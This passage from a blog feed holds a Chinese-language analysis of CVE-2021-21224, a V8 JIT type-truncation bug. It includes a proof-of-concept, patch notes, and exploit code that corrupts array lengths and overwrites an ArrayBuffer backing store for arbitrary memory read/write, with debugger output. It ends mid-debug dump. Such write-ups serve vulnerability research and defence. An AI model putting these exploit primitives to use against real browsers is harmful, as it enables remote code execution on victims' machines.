>http://www.ruanyifeng.com/blog/2018/07/web-worker.html<i class="fas fa-external-link-alt"></i></a></p><p>[7] <a class="link"   href="https://www.cnblogs.com/SZxiaochun/p/8017475.html" >https://www.cnblogs.com/SZxiaochun/p/8017475.html<i class="fas fa-external-link-alt"></i></a></p><p>[8] <a class="link"   href="https://www.cnblogs.com/yoyo-sincerely/p/8658075.html" >https://www.cnblogs.com/yoyo-sincerely/p/8658075.html<i class="fas fa-external-link-alt"></i></a></p><p>[9] <a class="link"   href="https://zhuanlan.zhihu.com/p/94588204" >https://zhuanlan.zhihu.com/p/94588204<i class="fas fa-external-link-alt"></i></a></p><p>[10] <a class="link"   href="https://www.jianshu.com/p/c2cd6c7e1976" >https://www.jianshu.com/p/c2cd6c7e1976<i class="fas fa-external-link-alt"></i></a></p><p>[11] <a class="link"   href="https://www.anquanke.com/post/id/194351" >https://www.anquanke.com/post/id/194351<i class="fas fa-external-link-alt"></i></a></p><p>[12] <a class="link"   href="https://www.4hou.com/posts/7OYQ" >https://www.4hou.com/posts/7OYQ<i class="fas fa-external-link-alt"></i></a></p><p>[13] <a class="link"   href="https://github.com/exodusintel/CVE-2019-5786/" >https://github.com/exodusintel/CVE-2019-5786/<i class="fas fa-external-link-alt"></i></a></p><p>[14] <a class="link"   href="https://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/" >https://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/<i class="fas fa-external-link-alt"></i></a></p><p>[15] <a class="link"   href="https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/" >https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/<i class="fas fa-external-link-alt"></i></a></p><p>[16] <a class="link"   href="https://www.anquanke.com/post/id/197892" >https://www.anquanke.com/post/id/197892<i class="fas fa-external-link-alt"></i></a></p><p>[17] <a class="link"   href="https://blogs.360.cn/post/RootCause_CVE-2019-0808_CH.html" >https://blogs.360.cn/post/RootCause_CVE-2019-0808_CH.html<i class="fas fa-external-link-alt"></i></a></p><p>[18] <a class="link"   href="https://github.com/monoxgas/sRDI" >https://github.com/monoxgas/sRDI<i class="fas fa-external-link-alt"></i></a></p><p>[19] <a class="link"   href="https://github.com/exodusintel/CVE-2019-0808" >https://github.com/exodusintel/CVE-2019-0808<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Blink-FileReader-UAF漏洞（CVE-2019-5786）&quot;&gt;&lt;a href=&quot;#Blink-FileReader-UAF漏洞（CVE-2019-5786）&quot; class=&quot;headerlink&quot; title=&quot;Blink FileReader U</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2021-21224</title>
    <link href="https://fa1lr4in.github.io/2021/05/12/CVE-2021-21224/"/>
    <id>https://fa1lr4in.github.io/2021/05/12/CVE-2021-21224/</id>
    <published>2021-05-12T09:32:05.000Z</published>
    <updated>2021-05-13T02:25:13.227Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V8远程代码执行漏洞"><a href="#V8远程代码执行漏洞" class="headerlink" title="V8远程代码执行漏洞"></a>V8远程代码执行漏洞</h1><h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1、漏洞简述"><a href="#1、漏洞简述" class="headerlink" title="1、漏洞简述"></a>1、漏洞简述</h3><ul><li>漏洞名称：V8远程代码执行漏洞</li><li>漏洞编号：CVE-2021-21224</li><li>漏洞类型：JIT优化导致可构造超长数组进行任意地址读写</li><li>漏洞影响：远程代码执行</li><li>CVSS3.0：N/A</li><li>CVSS2.0：N/A</li><li>漏洞危害等级：严重</li></ul><h3 id="2、组件和漏洞概述"><a href="#2、组件和漏洞概述" class="headerlink" title="2、组件和漏洞概述"></a>2、组件和漏洞概述</h3><p>V8是Google使用C++编写的开源高性能JavaScript和WebAssembly引擎。它被广泛用于用于Chrome和Node.js等场景中。它实现了ECMAScript和WebAssembly功能。V8既可以在Windows 7及以上版本，macOS 10.12+和使用x64，IA-32，ARM或MIPS处理器的Linux等操作系统上运行。也可以独立运行，还可以嵌入到任何C ++应用程序中。</p><h3 id="3、相关链接"><a href="#3、相关链接" class="headerlink" title="3、相关链接"></a>3、相关链接</h3><p>issue 1195777</p><p><a class="link"   href="https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html" >https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html<i class="fas fa-external-link-alt"></i></a></p><h3 id="4、解决方案"><a href="#4、解决方案" class="headerlink" title="4、解决方案"></a>4、解决方案</h3><p><a class="link"   href="https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html" >https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html<i class="fas fa-external-link-alt"></i></a></p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>安装89.0.4389.90的Chrome浏览器</p><h3 id="2、复现过程"><a href="#2、复现过程" class="headerlink" title="2、复现过程"></a>2、复现过程</h3><p>1、在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。</p><p>2、将漏洞文件拖入浏览器中执行</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210428110845631.png" alt="image-20210428110845631"></p><h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1、基本信息"><a href="#1、基本信息" class="headerlink" title="1、基本信息"></a>1、基本信息</h3><ul><li>漏洞文件：representation-change.cc</li><li>漏洞函数：RepresentationChanger::GetWord32RepresentationFor</li></ul><h3 id="2、补丁对比"><a href="#2、补丁对比" class="headerlink" title="2、补丁对比"></a>2、补丁对比</h3><p>观察v8修复漏洞详情，可以看到，在调用 TruncateInt64ToInt32 函数之前增加了一项检查，检查了当 output_type 为 Type::Unsigned32 时，user_info的类型是否为 TypeCheckKind::kNone。</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210508152028808.png" alt="image-20210508152028808"></p><h3 id="3、漏洞分析"><a href="#3、漏洞分析" class="headerlink" title="3、漏洞分析"></a>3、漏洞分析</h3><h4 id="（1）POC分析"><a href="#（1）POC分析" class="headerlink" title="（1）POC分析"></a>（1）POC分析</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;                                                      </span><br><span class="line">        <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a) x = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, -<span class="number">1</span>)));</span><br><span class="line">        arr.shift();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">        foo(<span class="literal">false</span>);                               </span><br><span class="line">    foo(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>分析下poc，在循环执行foo(false)函数时，Ignation会收集类型反馈并进行投机优化，交由TurboFan处理，此时最大值始终为0，最终会得到一个长度为0的数组，经由shift处理时，长度仍然为0；</p><p>最后执行foo(true)时，x值变为0XFFFFFFFF，当执行创建数组的操作时，执行了TruncateInt64ToInt32函数直接进行截断，而未进行类型检查，导致x被当作-1进行操作，<strong>此时创造了TurboFan意料之外的数据范围1</strong>，最终执行shift函数时创造了长度为-1的数组。</p><h4 id="（2）执行流分析"><a href="#（2）执行流分析" class="headerlink" title="（2）执行流分析"></a>（2）执行流分析</h4><p>在EscapeAnalysis阶段，程序的执行流按照我们所看到的那样，通过max函数确定函数的范围为（0，4294967295），经过sub操作后范围为（-4294967295，0），最后进行sign运算，得到的范围为（-1，0），最终进行边界检查，得到范围为（0，0）</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210512104858664.png" alt="image-20210512104858664"></p><p>而在SimplifiedLowering阶段，在select数据范围之后，调用了TruncateInt64ToInt32，最终在CheckedUint32Bounds得到的数据范围为Range（0，0）.</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210512105759695.png" alt="image-20210512105759695"></p><h4 id="（3）动态验证"><a href="#（3）动态验证" class="headerlink" title="（3）动态验证"></a>（3）动态验证</h4><p>调试v8，发现执行到 RepresentationChanger::GetWord32RepresentationFor 函数处理 output_rep 为  MachineRepresentation::kWord64 时的逻辑如下，此时的use_info的类型为 kSignedSmall 类型，由于该处并未对use_info执行检查，导致opcode为 TruncateInt64ToInt32 。</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210511201315964.png" alt="image-20210511201315964"></p><p>而当对漏洞代码进行修复后，则会执行CheckedUint64ToInt32或CheckedInt64ToInt32函数来对output_rep进行处理。</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210511202300798.png" alt="image-20210511202300798"></p><p>修复漏洞后的执行流程如下，此时确实调用了CheckedInt64ToInt32函数对操作数进行了处理</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210511204837988.png" alt="image-20210511204837988"></p><h4 id="（4）EXP构造"><a href="#（4）EXP构造" class="headerlink" title="（4）EXP构造"></a>（4）EXP构造</h4><p>公开exp的构造方式并非为传统的构造addressOf和fakeObject原语以及任意读写原语，而是通过DataView对象直接操作漏洞bufffer进行任意读写。</p><h5 id="（1）构造超长数组"><a href="#（1）构造超长数组" class="headerlink" title="（1）构造超长数组"></a>（1）构造超长数组</h5><p>根据上面的分析，可以得到一个长度为-1的超长的数组，下面是定义的gadget代码以及得到长度为-1数组的代码，代码中LeakArrayBuffer继承于ArrayBuffer，重写的LeakArrayBuffer与ArrayBuffer不同的地方在于定义了一个变量slot，定义该变量的目的就是为了通过类型混淆达到相对地址读的作用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&quot;0x&quot;</span>+i.toString(<span class="number">16</span>));</span><br><span class="line">    &#125; <span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80000</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">constructor</span>(<span class="params">size</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(size);                                                        <span class="comment">//super()相当与父类call，其实就是实现父类原有的功能，这里的super就是生成大小为size的缓冲区。</span></span><br><span class="line">            <span class="built_in">this</span>.slot = <span class="number">0xb33f</span>;                                                 <span class="comment">//定义了一个变量slot，</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;                                                      </span><br><span class="line">        <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a) x = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        <span class="comment">//console.log(x);    </span></span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, -<span class="number">1</span>)));</span><br><span class="line">        arr.shift();</span><br><span class="line">        <span class="comment">//console.log(arr.length);</span></span><br><span class="line">        <span class="keyword">let</span> local_arr = <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">        local_arr[<span class="number">0</span>] = <span class="number">5.1</span>;<span class="comment">//4014666666666666</span></span><br><span class="line">        <span class="keyword">let</span> buff = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x1000</span>);<span class="comment">//byteLength idx=8</span></span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">0x1122</span>;</span><br><span class="line">        <span class="keyword">return</span> [arr, local_arr, buff];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">        foo(<span class="literal">false</span>);                               </span><br><span class="line">    [corrupt_arr, rwarr, corrupt_buff] = foo(<span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(corrupt_arr.length);</span><br><span class="line">    %DebugPrint(corrupt_arr);</span><br><span class="line">    %SystemBreak();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行结果如下，从下面的执行结果可以看出corrupt_arr数组的长度为-1，并且打印出了corrupt_arr参数地址以及第0-17元素的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release# ./d8 test1.js --allow-natives-syntax</span><br><span class="line">-1</span><br><span class="line">DebugPrint: 0x11930809ca05: [JSArray]</span><br><span class="line"> - map: 0x1193082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x11930820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x11930809c9f9 &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: -1</span><br><span class="line"> - properties: 0x11930804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x1193080446c1: [String] in ReadOnlySpace: #length: 0x11930818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x11930809c9f9 &lt;FixedArray[67244566]&gt; &#123;</span><br><span class="line">           0: 4386</span><br><span class="line">           1: 0x1193082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           2: 0x11930804222d &lt;FixedArray[0]&gt;</span><br><span class="line">           3: 0x11930809c9f9 &lt;FixedArray[67244566]&gt;</span><br><span class="line">           4: -1</span><br><span class="line">           5: 0x119308042205 &lt;Map&gt;</span><br><span class="line">           6: 2</span><br><span class="line">         7-8: 0x11930804242d &lt;the_hole&gt;</span><br><span class="line">           9: 0x119308243a19 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line">          10: 0x11930804222d &lt;FixedArray[0]&gt;</span><br><span class="line">          11: 0x11930809ca39 &lt;FixedDoubleArray[2]&gt;</span><br><span class="line">          12: 2</span><br><span class="line">          13: 0x1193080422c5 &lt;Map[4]&gt;</span><br><span class="line">          14: 0x119308042a95 &lt;Map&gt;</span><br><span class="line">          15: 2</span><br><span class="line">          16: 858993459</span><br><span class="line">          17: 537539379</span><br><span class="line">Received signal 11 SEGV_ACCERR 1193fff7fffc</span><br><span class="line"></span><br><span class="line">==== C stack trace ===============================</span><br><span class="line"></span><br><span class="line"> [0x55d5d79b7b57]</span><br><span class="line"> [0x7f2be3f1c980]</span><br><span class="line"> [0x55d5d717ff59]</span><br><span class="line"> [0x55d5d717fc77]</span><br><span class="line"> [0x55d5d6eece05]</span><br><span class="line"> [0x55d5d6eeb455]</span><br><span class="line"> [0x55d5d6eeeecd]</span><br><span class="line"> [0x55d5d6ee718d]</span><br><span class="line"> [0x55d5d6edd188]</span><br><span class="line"> [0x55d5d6edc522]</span><br><span class="line"> [0x55d5d72fd95e]</span><br><span class="line"> [0x55d5d72f177e]</span><br><span class="line"> [0x1193000b2213]</span><br><span class="line">[end of stack trace]</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">root@ubuntu:~/v8/v8/out/x64.release#</span><br></pre></td></tr></table></figure><h5 id="（2）构建恶意DataView对象进行漏洞利用"><a href="#（2）构建恶意DataView对象进行漏洞利用" class="headerlink" title="（2）构建恶意DataView对象进行漏洞利用"></a>（2）构建恶意DataView对象进行漏洞利用</h5><p>这一步是这个漏洞利用比较精妙的部分了，首先通过查看内存获取corrupt_arr与rwarr的偏移量（调试信息中，上面的是rwarr的内存，下面的是corrupt_arr的内存，由于corrupt_arr的数组已经损坏，所以将corrupt_arr放在上面读取信息时会出错）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="regexp">/v8/</span>v8/out/x64.release# ./d8 test1.js --allow-natives-syntax</span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="attr">DebugPrint</span>: <span class="number">0xda708098035</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x0da708243a19</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0da70820b959</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x0da708098049</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; [HOLEY_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">2</span></span><br><span class="line"> - properties: <span class="number">0x0da70804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0xda7080446c1</span>: [<span class="built_in">String</span>] <span class="keyword">in</span> ReadOnlySpace: #length: <span class="number">0x0da70818215d</span> &lt;AccessorInfo&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0da708098049</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">5.1</span></span><br><span class="line">           <span class="number">1</span>: &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="attr">DebugPrint</span>: <span class="number">0xda708098015</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x0da7082439c9</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0da70820b959</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x0da708098009</span> &lt;FixedArray[<span class="number">67244566</span>]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: -<span class="number">1</span></span><br><span class="line"> - properties: <span class="number">0x0da70804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0xda7080446c1</span>: [<span class="built_in">String</span>] <span class="keyword">in</span> ReadOnlySpace: #length: <span class="number">0x0da70818215d</span> &lt;AccessorInfo&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0da708098009</span> &lt;FixedArray[<span class="number">67244566</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">4386</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">0x0da7082439c9</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x0da70804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x0da708098009</span> &lt;FixedArray[<span class="number">67244566</span>]&gt;</span><br><span class="line">           <span class="number">4</span>: -<span class="number">1</span></span><br><span class="line">           <span class="number">5</span>: <span class="number">0x0da708042205</span> &lt;<span class="built_in">Map</span>&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">2</span></span><br><span class="line">         <span class="number">7</span>-<span class="number">8</span>: <span class="number">0x0da70804242d</span> &lt;the_hole&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">0x0da708243a19</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line">          <span class="number">10</span>: <span class="number">0x0da70804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x0da708098049</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt;</span><br><span class="line">          <span class="number">12</span>: <span class="number">2</span></span><br><span class="line">          <span class="number">13</span>: <span class="number">0x0da7080422c5</span> &lt;<span class="built_in">Map</span>[<span class="number">4</span>]&gt;</span><br><span class="line">          <span class="number">14</span>: <span class="number">0x0da708042a95</span> &lt;<span class="built_in">Map</span>&gt;</span><br><span class="line">          <span class="number">15</span>: <span class="number">2</span></span><br><span class="line">          <span class="number">16</span>: <span class="number">858993459</span></span><br><span class="line">          <span class="number">17</span>: <span class="number">537539379</span></span><br><span class="line">Received signal <span class="number">11</span> SEGV_ACCERR 0da7fff7fffc</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由上面的结果可以推算出(0xda708098035-0x0da708098009)/4 -&gt; 0x2c/4 -&gt; 11，所以corrupt_arr偏移11的位置为rwarr的map，那么corrupt_arr偏移12的位置处为rwarr的length（具体内存结构可以通过动态调试来获取）。</p><p>那么我们修改rwarr的length语句则为，之后销毁那个被损坏的数组对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">corrupt_arr[<span class="number">12</span>] = <span class="number">0x22444</span>;</span><br><span class="line"><span class="keyword">delete</span> corrupt_arr;  </span><br></pre></td></tr></table></figure><p>之后我们的相对内存读写通过这个未被损坏的数组进行操作。接下来构造两个函数，实现如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setbackingStore</span>(<span class="params">hi, low</span>) </span>&#123;</span><br><span class="line">    rwarr[<span class="number">4</span>] = i2f(f2i(rwarr[<span class="number">4</span>]), hi);</span><br><span class="line">    rwarr[<span class="number">5</span>] = i2f(low, f4i(rwarr[<span class="number">5</span>]));              <span class="comment">//给corrupt_buff的backing_store属性赋值，backing_store：0xb7080d6fc4（8位）、rwarr[4]：0xb7080d6fc0（8位）、rwarr[5]：0xb7080d6fc8（8位）</span></span><br><span class="line">&#125; <span class="function"><span class="keyword">function</span> <span class="title">leakObjLow</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">    corrupt_buff.slot = o;</span><br><span class="line">    <span class="keyword">return</span> (f2i(rwarr[<span class="number">9</span>]) - <span class="number">1</span>);                      <span class="comment">//因为采用了地址压缩，所以当前内存中只存取了低四字节地址。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leakObjLow主要是为了泄露低地址的值，由于采用了地址压缩，所以当前内存中只存取了低四字节地址。内存如下（rwarr[9]为slot的内存，rwarr[4]的高地址和rwarr[5]的低地址为corrupt_buff的backing_store属性值，通过恶意DataView对象对backing_store进行操作，即可完成任意地址读写）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x0766080e8099-1 rwarr_addr</span><br><span class="line">00:0000│  0x766080e8098 ◂— 0x408042a95</span><br><span class="line">01:0008│  0x766080e80a0 ◂— 0x4014666666666666rwarr[0]</span><br><span class="line">02:0010│  0x766080e80a8 ◂— 0xfff7fffffff7ffff</span><br><span class="line">03:0018│  0x766080e80b0 ◂— 0x804222d08247231</span><br><span class="line">04:0020│  0x766080e80b8 ◂— 0x10000804222d</span><br><span class="line">05:0028│  0x766080e80c0 ◂— 0xec3bfdf000000000rwarr[4]</span><br><span class="line">06:0030│  0x766080e80c8 ◂— 0xec3bfdc0000055fdrwarr[5]</span><br><span class="line">07:0038│  0x766080e80d0 ◂— 0x2000055fd</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x766080e80b1-1 corrupt_buff_addr</span><br><span class="line">00:0000│  0x766080e80b0 ◂— 0x804222d08247231</span><br><span class="line">01:0008│  0x766080e80b8 ◂— 0x10000804222d</span><br><span class="line">02:0010│  0x766080e80c0 ◂— 0xec3bfdf000000000</span><br><span class="line">03:0018│  0x766080e80c8 ◂— 0xec3bfdc0000055fd</span><br><span class="line">04:0020│  0x766080e80d0 ◂— 0x2000055fd</span><br><span class="line">05:0028│  0x766080e80d8 ◂— 0x0</span><br><span class="line">06:0030│  0x766080e80e0 ◂— 0x0</span><br><span class="line">07:0038│  0x766080e80e8 ◂— 0x80422050001667erwarr[9]</span><br><span class="line">08:0040│  0x766080e80f0 ◂— 0x80e806500000006</span><br><span class="line"></span><br><span class="line">─</span><br><span class="line">pwndbg&gt; job 0x766080e80b1</span><br><span class="line">       18-19: [weak] 0x0766fff7fffd 0x766080e80b1: [JSArrayBuffer]</span><br><span class="line"> - map: 0x076608247231 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x07660818cb45 &lt;LeakArrayBuffer map = 0x76608247209&gt;</span><br><span class="line"> - elements: 0x07660804222d 